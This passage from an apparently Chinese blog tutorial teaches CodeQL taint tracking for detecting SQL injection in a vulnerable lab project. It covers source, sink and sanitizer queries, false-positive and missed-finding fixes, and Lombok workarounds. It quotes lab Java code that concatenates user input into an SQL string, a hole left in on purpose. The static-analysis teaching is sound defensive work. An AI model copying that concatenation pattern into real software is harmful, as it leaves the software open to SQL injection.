class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;getStudent&quot;)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getLimitedMethod.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">method.getName() <span class="comment">// 获取的是当前方法的名称</span></span><br><span class="line">method.getDeclaringType() / 获取的是当前方法所属class的名称。</span><br></pre></td></tr></table></figure><h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。</p><p>这个函数，就叫谓词。</p><p>比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">predicate isStudent(Method method) &#123;</span><br><span class="line">exists(|method.hasName(&quot;getStudent&quot;))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where isStudent(method)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><blockquote><p>语法解释</p></blockquote><p><code>predicate</code> 表示当前方法没有返回值。<br><code>exists</code> 子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回 <code>true or false</code>，来决定筛选出哪些数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/predicate.png" class><h3 id="设置-Source-和-Sink"><a href="#设置-Source-和-Sink" class="headerlink" title="设置 Source 和 Sink"></a>设置 Source 和 Sink</h3><p>什么是source和sink</p><p>在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</p><p>source 是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink 是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p><p>只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sourceToSink.png" class><ul><li>设置 Source</li></ul><p>在 micro_service_seclab 中，对应的 Source 举个例子，SQL 注入的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/one&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">one</span><span class="params">(<span class="meta">@RequestParam(value = &quot;username&quot;)</span> String username)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(username);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应 CodeQL 当中的 Source</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p><code>RemoteFlowSource</code> 类（在<code>semmle.code.java.dataflow.FlowSources</code>）中定义）表示可能由远程用户控制的数据流源，这里这段代码的传参比较简单，但其实传参如果复杂，比如是一个类的情况下，也是类似的</p><p>在下面的代码中，source就是<code>Student user</code>(user为Student类型，这个不受影响)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/object&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">objectParam</span><span class="params">(<span class="meta">@RequestBody</span> Student user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>设置 Sink</li></ul><p>在本案例中，我们的sink应该为<code>query</code>方法(Method)的调用(MethodAccess)，所以我们设置Sink为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">exists(Method method, MethodAccess call |</span><br><span class="line">  method.hasName(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">  and</span><br><span class="line">  call.getMethod() = method and</span><br><span class="line">  sink.asExpr() = call.getArgument(<span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个query()方法的调用点，并把它的第一个参数设置为sink。 </p><p>在靶场系统(<code>micro-service-seclab</code>)中，sink就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.query(sql, ROW_MAPPER);</span><br></pre></td></tr></table></figure><p>因为我们测试的注入漏洞，当source变量流入这个方法的时候，才会发生注入漏洞！</p><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>在设置完 Source 和 Sink 之后，我们需要确认 Source 到 Sink 是能够走通的，这一段的连通工作就是 CodeQL 引擎本身来完成的。我们通过 <code>config.hasFlowPath(source, sink)</code> 方法来判断是否连通。</p><p>比如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>我们传递给 <code>config.hasFlowPath(source, sink)</code> 我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。</p><h2 id="0x03-CodeQL-语句优化"><a href="#0x03-CodeQL-语句优化" class="headerlink" title="0x03 CodeQL 语句优化"></a>0x03 CodeQL 语句优化</h2><h3 id="初步成果"><a href="#初步成果" class="headerlink" title="初步成果"></a>初步成果</h3><p>经过整理之后的 ql 查询代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/Result.png" class><p>CodeQL 在定义类上的语法和 Java 类似，其中 extends 的父类 <code>TaintTracking::Configuration</code> 是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink)</p><p><code>src instanceof RemoteFlowSource</code> 表示src 必须是 RemoteFlowSource 类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。</p><ul><li>注：上面的注释和其它语言是不一样的，不能够删除，它是程序的一部分，因为在我们生成测试报告的时候，上面注释当中的name，description等信息会写入到审计报告中。</li></ul><h3 id="误报解决"><a href="#误报解决" class="headerlink" title="误报解决"></a>误报解决</h3><p>扫描结果当中存在一项误报</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/wubao.png" class><p>这个方法的参数类型是 <code>List&lt;Long&gt;</code>，不可能存在注入漏洞。</p><p>这说明我们的规则里，对于 <code>List&lt;Long&gt;</code> ，甚至 <code>List&lt;Integer&gt;</code> 类型都会产生误报，source 误把这种类型的参数涵盖了。</p><p>我们需要采取手段消除这种误报。</p><p>这个手段就是 <code>isSanitizer</code>。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isSanitizer.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是：</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;&#125;</span><br><span class="line"></span><br><span class="line">在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断。</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">node.getType() instanceof PrimitiveType or</span><br><span class="line">node.getType() instanceof BoxedType or</span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在。</span><br></pre></td></tr></table></figure><p>由于 CodeQL 检测SQL注入里的 <code>isSanitizer</code> 方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报问题。</p><p>那我们只需要将这种复合类型加入到 <code>isSanitizer</code> 方法，即可消除这种误报。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )  // 这里的 ParameterizedType 代表所有泛型，判断泛型当中的传参是否为 Number 型</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。  </p><p>重新执行query，我们发现，刚才那条误报已经被成功消除啦。</p><h3 id="漏报解决"><a href="#漏报解决" class="headerlink" title="漏报解决"></a>漏报解决</h3><p>我们发现，如下的SQL注入并没有被CodeQL捕捉到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">getStudentWithOptional</span><span class="params">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlWithOptional</span> <span class="operator">=</span> <span class="string">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏报理论上讲是不能接受的。如果出现误报我们还可以通过人工筛选来解决，但是漏报会导致很多漏洞流经下一个环节到线上，从而产生损失。</p><p>那我们如果通过CodeQL来解决漏报问题呢？答案就是通过 <code>isAdditionalTaintStep</code> 方法。</p><p>实现原理就一句话：<strong>断了就强制给它接上。</strong></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isAdditionalTaintStep.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">isAdditionalTaintStep方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是：</span><br><span class="line"></span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;&#125;</span><br><span class="line"></span><br><span class="line">它的作用是将一个可控节点</span><br><span class="line">A强制传递给另外一个节点B，那么节点B也就成了可控节点。</span><br></pre></td></tr></table></figure><p>这里由于 Optional 这种类型的使用没有在 CodeQL 的语法库里，我们需要强制让 <code>username</code> 流转到<code>username.get()</code>，这样 <code>username.get()</code> 就变得可控了。这样应该就能识别出这个注入漏洞了。</p><p><strong>完整代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// 解决 SQL 注入 QL 语句的漏保</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call, MethodAccess call1|</span><br><span class="line">        expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method</span><br><span class="line">        and method.hasName(&quot;get&quot;) and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)  // sink.asExpr() 是一个方法，用于将一个 sink 转换成一个表达式。这个方法通常用于在查询中使用 sink，因为查询需要将 sink 转换成表达式才能进行分析。</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">        node.getType() instanceof PrimitiveType or</span><br><span class="line">        node.getType() instanceof BoxedType or</span><br><span class="line">        node.getType() instanceof NumberType or</span><br><span class="line">        exists(ParameterizedType pt| </span><br><span class="line">            node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType</span><br><span class="line">         )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="Lombok-插件漏报"><a href="#Lombok-插件漏报" class="headerlink" title="Lombok 插件漏报"></a>Lombok 插件漏报</h3><p>Lombok 的注解并不会直接被 CodeQL 所解析，导致其中的中间链路会“中道崩殂”，我们用以下方法来解决。</p><h4 id="解决方法-①"><a href="#解决方法-①" class="headerlink" title="解决方法 ①"></a>解决方法 ①</h4><p>使用 <code>maven-delombok</code>，在 <code>pom.xml</code> 中添加以下代码，重新编译即可。（推荐）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>target/generated-sources/delombok<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>target/generated-test-sources/delombok<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">executions</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>test-delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-test-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testDelombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/test/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">executions</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><h4 id="解决办法-②"><a href="#解决办法-②" class="headerlink" title="解决办法 ②"></a>解决办法 ②</h4><p>CodeQL官方的issue里面，有人给出了这个问题的解决办法 <a class="link" href="https://github.com/github/codeql/issues/4984">https://github.com/github/codeql/issues/4984<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get a copy of lombok.jar</span></span><br><span class="line">wget https://projectlombok.org/downloads/lombok.jar -O <span class="string">&quot;lombok.jar&quot;</span></span><br><span class="line"><span class="comment"># run &quot;delombok&quot; on the source files and write the generated files to a folder named &quot;delombok&quot;</span></span><br><span class="line">java -jar <span class="string">&quot;lombok.jar&quot;</span> delombok -n --onlyChanged . -d <span class="string">&quot;delombok&quot;</span></span><br><span class="line"><span class="comment"># remove &quot;generated by&quot; comments</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/Generated by delombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># remove any left-over import statements</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/import lombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># copy delombok&#x27;d files over the original ones</span></span><br><span class="line"><span class="built_in">cp</span> -r <span class="string">&quot;delombok/.&quot;</span> <span class="string">&quot;./&quot;</span></span><br><span class="line"><span class="comment"># remove the &quot;delombok&quot; folder</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;delombok&quot;</span></span><br></pre></td></tr></table></figure><p>没有特别明白这个应该在哪个目录下执行命令。</p><p>上面的代码，实现的功能是：去掉代码里的lombok注解，并还原setter和getter方法的java代码，从而使CodeQL的Flow流能够顺利走下去，<br>从而检索到安全漏洞。</p><h3 id="持续工程化"><a href="#持续工程化" class="headerlink" title="持续工程化"></a>持续工程化</h3><p>到此为止，我们编写了SQL注入的查询语句，消除了误报和漏报问题。当前的规则已经能够适应micro-service-seclab项目啦。</p><p>因为我们的micro-service-seclab项目，是按照标准生成的微服务结构，那么我们可以使用这个ql规则去跑其他的项目，来自动化检测其它项目，从而做到自动化检测，提高安全检测效率。</p><p>CodeQL除了提供VSCode的检测插件，也提供了大量的命令行，来实现项目的集成检测。</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice\database --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>我们通过上面语句自动生成 codeql 的中间数据库(database)</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><p>这里是很容易踩坑的，因为前面的语句有个问题就是 select 的返回值并非是 string，所以就会报错，报错信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error was: Expected result pattern(s) are not present <span class="keyword">for</span> problem query: Expected exactly one pattern. </span><br></pre></td></tr></table></figure><p>参考 <a class="link" href="https://xz.aliyun.com/t/10852#toc-7">https://xz.aliyun.com/t/10852#toc-7<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x04-CodeQL-进阶"><a href="#0x04-CodeQL-进阶" class="headerlink" title="0x04 CodeQL 进阶"></a>0x04 CodeQL 进阶</h2><h3 id="用-instanceof-替代复杂查询语句问题"><a href="#用-instanceof-替代复杂查询语句问题" class="headerlink" title="用 instanceof 替代复杂查询语句问题"></a>用 instanceof 